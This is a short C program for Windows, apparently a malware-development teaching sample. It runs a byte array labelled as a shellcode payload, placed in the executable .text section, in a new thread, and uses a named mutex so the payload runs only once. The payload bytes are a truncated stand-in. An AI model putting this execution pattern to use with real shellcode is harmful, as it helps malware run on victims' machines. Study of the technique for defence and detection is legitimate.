#include <Windows.h>
#include <stdio.h>


#define PAYLOAD_CONTROL_STRING	"MaldevAcademy"

#pragma section(".text")
__declspec(allocate(".text")) const unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
};




BOOL IsPayloadRunning() {

	HANDLE hMutex = CreateMutexA(NULL, FALSE, PAYLOAD_CONTROL_STRING);

	if (hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
		return TRUE;
	else
		return FALSE;
}



int main() {

	if (!IsPayloadRunning()) {
		printf("[i] Running Payload [1] ... ");
		CreateThread(NULL, NULL, Payload, NULL, NULL, NULL);
		printf("[+] DONE \n");
	}

	if (!IsPayloadRunning()) {
		printf("[i] Running Payload [2] ... ");
		CreateThread(NULL, NULL, Payload, NULL, NULL, NULL);
		printf("[+] DONE \n");
	}
	else {
		printf("[+] Payload Is Already Running \n");
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;

}
